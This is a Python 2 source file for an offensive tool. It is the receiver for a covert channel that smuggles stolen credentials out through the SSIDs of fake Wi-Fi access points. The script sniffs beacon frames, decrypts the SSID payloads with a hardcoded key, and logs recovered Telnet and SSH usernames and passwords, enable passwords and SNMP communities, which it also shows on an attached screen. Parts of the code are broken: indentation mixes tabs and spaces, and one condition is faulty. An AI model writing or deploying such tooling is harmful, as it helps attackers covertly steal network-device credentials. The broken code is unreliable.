#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import sys
import os
import re
import signal
import argparse
import pyaes
import pyscrypt
import pygame
import collections
import threading
import daemon
import time
from scapy.all import Dot11, Dot11Elt, Dot11Beacon, sniff

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.4"

# Config
phrase = 'Waaaaa! awesome :)'
salt = 'salgruesa'
dirname = '/home/pi/circo/jaula/'
motd = dirname + 'motd'
DEBUG = False
TFT = False
WHITE = (255, 255, 255)


# Classes
class APHandler(threading.Thread):
    """
    Class to observe 802.11 Becon packets
    and decrypt credentials inside SSID name
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
	self.dic = {}
	self.pkttotal = 0
	self.pktlen = 0
	self.cnt = True
	self.sid = []

    def pkt_callback(self, pkt):
	# Look for beacon with SSID 'aterm-c17c02' as starting SSID
	# grab crypto len & amount of SSID's with crypto on it (use -g on those)
	if pkt.haslayer(Dot11Beacon):
        if (pkt[Dot11Elt].info == 'aterm-c17c02') and (self.cnt):
                self.pkttotal = pkt[Dot11].SC
                self.pktlen = pkt[Dot11Beacon].beacon_interval
                self.cnt = False
        elif ('aterm' and '-g' in pkt[Dot11Elt].info):
                if pkt[Dot11Beacon].beacon_interval == self.pktlen:
                    if str(pkt[Dot11Elt].info).split('-')[1] not in self.sid:
                        self.dic[pkt[Dot11].SC] = str(
                            pkt[Dot11Elt].info).split('-')[1]
                        self.sid.append(str(pkt[Dot11Elt].info).split('-')[1])
        if (len(self.dic) == self.pkttotal) and (self.pkttotal > 0):
                odic = collections.OrderedDict(sorted(self.dic.items()))
                final = ''
                for k, v in odic.iteritems():
                    final = final + v
                text = decrypti(final[:self.pktlen])
                text = text.strip()
                hexip = text.split(',')[-1]
                srcip = hextoip(hexip)
                text = text.replace(hexip, hextoip(hexip))
                if DEBUG:
                    print('Receive Credentails via Fake-AP:')
                    print(time.strftime("%Y-%m-%d %H:%M:%S ",
                          time.gmtime()) + text)
                find = re.compile('\\b' + text + '\\b')
                with open(self.fd, 'a+') as sfile:
                    with open(self.fd, 'r') as xfile:
                        m = find.findall(xfile.read())
                        if not m:
                            sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
                                        time.gmtime()) + text + '\n')
                if TFT:
                    if text.startswith('t,e,'):
                        data = ['Telnet:', 'Enable Pass: '
                                + text.split(',')[2],
                                'From IP: ' + text.split(',')[-1]
                                ]
                    elif text.startswith('s,e,'):
                        data = ['SSH:', 'Enable Pass: '
                                + text.split(',')[2],
                                'From IP: ' + text.split(',')[-1]
                                ]
                    elif text.startswith('p,'):
                        data = ['SNMP:', 'Community: '
                                + text.split(',')[1],
                                'From IP: ' + text.split(',')[-1]
                                ]
                    elif text.startswith('t,'):
                        data = ['Telnet:', 'User: '
                                + text.split(',')[1], 'Pass: '
                                + text.split(',')[2],
                                'From IP: ' + text.split(',')[-1]
                                ]
                    elif text.startswith('s,'):
                        data = ['SSH:', 'User: '
                                + text.split(',')[1], 'Pass: '
                                + text.split(',')[2],
                                'From IP: ' + text.split(',')[-1]
                                ]
                    kill_process('fbi')
                    lcd = tftinit()
                    tftmsg(lcd, 'FOUND', (160, 40), 50)
                    tftmsg(lcd, 'CREDENTIALS', (160, 80), 50)
                    q = 0
                    for x in range(len(data)):
                        tftmsg(lcd, data[x], (160, 130 + q), 30)
                        q = q + 30

                self.dic = {}
                self.sid = []
                self.pktlen = 0
                self.pkttotal = 0
                self.cnt = True

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, store=0)

    def join(self):
        self.stoprequest.set()


# Functions
def tftinit():
    os.putenv('SDL_FBDEV', '/dev/fb1')
    pygame.init()
    pygame.mouse.set_visible(False)
    lcd = pygame.display.set_mode((320, 240))
    lcd.fill((0, 0, 0))
    pygame.display.update()
    return lcd

def tftmsg(lcd, msg, pos, fsize):
    font_big = pygame.font.Font(None, fsize)
    txt = font_big.render(msg, True, WHITE)
    wh = txt.get_rect(center=pos)
    lcd.blit(txt, wh)
    pygame.display.update()

def kill_process(pstring):
    for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
        fields = line.split()
        pid = fields[0]
        os.kill(int(pid), signal.SIGTERM)

def decrypti(ciphertxt):
    hashed = pyscrypt.hash(phrase, salt, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    cleartxt = aes.decrypt(ciphertxt.decode('hex'))
    return cleartxt

def hextoip(ip):
    n = 2
    return '.'.join([str(int(ip[i:i+n], 16)) for i in range(0, len(ip), n)])

def parsingopt():
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--verbose',
                        action='store_true', help='Enable debugging')
    parser.add_argument('-t', '--tft',
                        action='store_true', help='Enable TFT')
    parser.add_argument('-i', required=True,
                        metavar='<wlan0mon>', dest='wnic', help='wlan int')
    parser.add_argument('-f', required=True,
                        metavar='<file>', dest='fd', help='Output file')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        with open(motd, 'r') as sfile:
            print(sfile.read())
        print('Author: ' + __author__)
        print('Version: ' + __version__ + '\n')
        parser.print_help()
        sys.exit(1)

# Main Function

def main():
    global TFT
    global DEBUG
    options = parsingopt()
    if options.verbose:
        DEBUG = True
    if options.tft:
        TFT = True

    if DEBUG:
        print('Listening.....')

    # AP Sniff Thread
    apdh = APHandler(options.wnic, options.fd)
    apdh.daemon = True
    apdh.start()

    # Running loop
    try:
        while True:
            pass
    except KeyboardInterrupt:
	apdh.join()
        sys.exit(0)


# Call main
if __name__ == '__main__':
    main()
